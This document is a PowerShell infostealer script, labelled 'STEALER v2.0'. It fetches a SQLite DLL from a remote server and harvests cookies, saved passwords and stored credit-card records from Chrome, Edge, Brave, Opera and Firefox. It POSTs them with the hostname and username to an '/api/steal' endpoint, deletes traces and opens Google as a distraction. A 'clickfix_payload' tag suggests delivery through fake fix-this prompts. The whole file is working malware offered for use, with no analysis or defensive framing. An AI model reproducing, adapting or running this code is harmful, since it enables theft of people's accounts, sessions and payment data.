# ============================================================
# BROWSER STEALER — SQLite Auto-Loader (FIXED)
# ============================================================

$ErrorActionPreference = "SilentlyContinue"
$SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"

function Write-Color {
    param($Message, $Color = "White")
    Write-Host $Message -ForegroundColor $Color
}

# ============================================================
# SQLITE LOADER
# ============================================================

function Load-SQLite {
    Write-Color "[+] Loading SQLite..." "Cyan"
    
    try {
        [System.Data.SQLite.SQLiteConnection]::new() | Out-Null
        Write-Color "[+] SQLite loaded from GAC" "Green"
        return $true
    } catch {
        Write-Color "[!] SQLite not in GAC" "Yellow"
    }
    
    $dllPath = "$env:TEMP\System.Data.SQLite.dll"
    
    if (-not (Test-Path $dllPath)) {
        Write-Color "[+] Downloading SQLite DLL..." "Cyan"
        
        $urls = @(
            "https://cipheranon-production.up.railway.app/System.Data.SQLite.dll",
            "https://github.com/eroz/System.Data.SQLite/raw/master/bin/System.Data.SQLite.dll"
        )
        
        $downloaded = $false
        foreach ($url in $urls) {
            try {
                $webClient = New-Object System.Net.WebClient
                $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
                $webClient.DownloadFile($url, $dllPath)
                if (Test-Path $dllPath -and (Get-Item $dllPath).Length -gt 10000) {
                    $downloaded = $true
                    Write-Color "[+] Downloaded successfully" "Green"
                    break
                }
            } catch {}
        }
        
        if (-not $downloaded) {
            Write-Color "[!] Failed to download SQLite" "Red"
            return $false
        }
    }
    
    try {
        [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
        Write-Color "[+] SQLite loaded successfully" "Green"
        return $true
    } catch {
        Write-Color "[!] Failed to load SQLite: $_" "Red"
        return $false
    }
}

# ============================================================
# SQLITE HELPER
# ============================================================

function Read-SQLite {
    param($DbPath, $Query)
    $results = @()
    try {
        if (-not (Test-Path $DbPath)) { return $results }
        
        $tempDb = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
        Copy-Item $DbPath $tempDb -Force
        
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;")
        $conn.Open()
        
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = $Query
        $reader = $cmd.ExecuteReader()
        
        while ($reader.Read()) {
            $row = @{}
            for ($i = 0; $i -lt $reader.FieldCount; $i++) {
                $name = $reader.GetName($i)
                $value = $reader.GetValue($i)
                if ($value -ne $null) {
                    $row[$name] = $value
                }
            }
            $results += $row
        }
        
        $reader.Close()
        $conn.Close()
        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
        
    } catch {}
    return $results
}

# ============================================================
# COOKIE STEALER
# ============================================================

function Get-BrowserCookies {
    param($DbPath, $BrowserName)
    $cookies = @()
    if (Test-Path $DbPath) {
        $rows = Read-SQLite -DbPath $DbPath -Query "SELECT host_key, name, value, path, expires_utc, secure, httponly FROM cookies"
        foreach ($row in $rows) {
            if ($row['name'] -and $row['value'] -and $row['name'] -ne "name") {
                $cookies += @{
                    domain = $row['host_key'] -replace '^\.', ''
                    name = $row['name']
                    value = $row['value']
                    path = "/"
                    expires = 0
                    secure = $false
                    httponly = $false
                    browser = $BrowserName
                }
            }
        }
    }
    return $cookies
}

function Get-FirefoxCookies {
    $cookies = @()
    $profilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profilePath) {
        $profiles = Get-ChildItem $profilePath -Directory
        foreach ($profile in $profiles) {
            $cookieFile = "$($profile.FullName)\cookies.sqlite"
            if (Test-Path $cookieFile) {
                $rows = Read-SQLite -DbPath $cookieFile -Query "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies"
                foreach ($row in $rows) {
                    if ($row['name'] -and $row['value']) {
                        $cookies += @{
                            domain = $row['host'] -replace '^\.', ''
                            name = $row['name']
                            value = $row['value']
                            path = "/"
                            expires = 0
                            secure = $false
                            httponly = $false
                            browser = "Firefox"
                        }
                    }
                }
            }
        }
    }
    return $cookies
}

# ============================================================
# PASSWORD STEALER
# ============================================================

function Get-ChromePasswords {
    param($DbPath, $BrowserName)
    $passwords = @()
    if (Test-Path $DbPath) {
        $rows = Read-SQLite -DbPath $DbPath -Query "SELECT origin_url, username_value, password_value FROM logins"
        foreach ($row in $rows) {
            if ($row['username_value'] -and $row['password_value']) {
                $url = $row['origin_url'] -replace 'https?://', ''
                $passwords += @{
                    url = $url
                    username = $row['username_value']
                    password = $row['password_value']
                    browser = $BrowserName
                }
            }
        }
    }
    return $passwords
}

function Get-FirefoxPasswords {
    $passwords = @()
    $profilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profilePath) {
        $profiles = Get-ChildItem $profilePath -Directory
        foreach ($profile in $profiles) {
            $loginsFile = "$($profile.FullName)\logins.json"
            if (Test-Path $loginsFile) {
                try {
                    $content = Get-Content $loginsFile -Raw | ConvertFrom-Json
                    foreach ($login in $content.logins) {
                        $passwords += @{
                            url = $login.hostname -replace 'https?://', ''
                            username = $login.username
                            password = $login.password
                            browser = "Firefox"
                        }
                    }
                } catch {}
            }
        }
    }
    return $passwords
}

# ============================================================
# CREDIT CARD STEALER
# ============================================================

function Get-ChromeCards {
    param($DbPath, $BrowserName)
    $cards = @()
    if (Test-Path $DbPath) {
        $rows = Read-SQLite -DbPath $DbPath -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
        foreach ($row in $rows) {
            if ($row['name_on_card'] -and $row['card_number_encrypted']) {
                $cards += @{
                    name = $row['name_on_card']
                    number = $row['card_number_encrypted']
                    month = $row['expiration_month']
                    year = $row['expiration_year']
                    browser = $BrowserName
                }
            }
        }
    }
    return $cards
}

# ============================================================
# MAIN EXECUTION
# ============================================================

$pcName = $env:COMPUTERNAME
$userName = $env:USERNAME

Write-Color ""
Write-Color "============================================" "Cyan"
Write-Color "  STEALER v2.0" "Green"
Write-Color "  Target: $pcName" "Yellow"
Write-Color "============================================" "Cyan"
Write-Color ""

$sqliteLoaded = Load-SQLite

if (-not $sqliteLoaded) {
    Write-Color "[!] SQLite not available" "Red"
}

# ---- Cookies ----
$allCookies = @()
Write-Color "[+] Chrome cookies..." "Cyan"
$p = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -DbPath $p -BrowserName "Chrome"

Write-Color "[+] Edge cookies..." "Cyan"
$p = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -DbPath $p -BrowserName "Edge"

Write-Color "[+] Brave cookies..." "Cyan"
$p = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -DbPath $p -BrowserName "Brave"

Write-Color "[+] Opera cookies..." "Cyan"
$p = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
$allCookies += Get-BrowserCookies -DbPath $p -BrowserName "Opera"

Write-Color "[+] Firefox cookies..." "Cyan"
$allCookies += Get-FirefoxCookies

# ---- Passwords ----
$allPasswords = @()
Write-Color "[+] Chrome passwords..." "Cyan"
$p = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$allPasswords += Get-ChromePasswords -DbPath $p -BrowserName "Chrome"

Write-Color "[+] Edge passwords..." "Cyan"
$p = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$allPasswords += Get-ChromePasswords -DbPath $p -BrowserName "Edge"

Write-Color "[+] Brave passwords..." "Cyan"
$p = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
$allPasswords += Get-ChromePasswords -DbPath $p -BrowserName "Brave"

Write-Color "[+] Firefox passwords..." "Cyan"
$allPasswords += Get-FirefoxPasswords

# ---- Cards ----
$allCards = @()
Write-Color "[+] Chrome cards..." "Cyan"
$p = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
$allCards += Get-ChromeCards -DbPath $p -BrowserName "Chrome"

Write-Color "[+] Edge cards..." "Cyan"
$p = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
$allCards += Get-ChromeCards -DbPath $p -BrowserName "Edge"

Write-Color "[+] Brave cards..." "Cyan"
$p = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
$allCards += Get-ChromeCards -DbPath $p -BrowserName "Brave"

# ---- Summary ----
Write-Color ""
Write-Color "=== SUMMARY ===" "Green"
Write-Color "Cookies:    $($allCookies.Count)" "Yellow"
Write-Color "Passwords:  $($allPasswords.Count)" "Yellow"
Write-Color "Cards:      $($allCards.Count)" "Yellow"
Write-Color ""

# ---- Payload ----
$payload = @{
    cookies = $allCookies
    passwords = $allPasswords
    cards = $allCards
    system = @{
        hostname = $pcName
        username = $userName
        os = (Get-WmiObject Win32_OperatingSystem).Caption
    }
    fingerprint = @{
        userAgent = "PowerShell Payload (Windows)"
        hostname = $pcName
        browser = "PowerShell"
        screen = "N/A"
    }
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    pcName = $pcName
}

# ---- Send ----
Write-Color "[+] Sending data..." "Cyan"
try {
    $json = $payload | ConvertTo-Json -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $webRequest = [System.Net.WebRequest]::Create($SERVER_URL)
    $webRequest.Method = "POST"
    $webRequest.ContentType = "application/json"
    $webRequest.ContentLength = $bytes.Length
    $stream = $webRequest.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $response = $webRequest.GetResponse()
    $response.Close()
    Write-Color "[+] Data sent!" "Green"
} catch {
    Write-Color "[!] Failed: $_" "Red"
}

# ---- Cleanup ----
Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

# ---- Distraction ----
Start-Process "https://www.google.com"

Write-Color "[+] Done!" "Green"
Write-Color ""
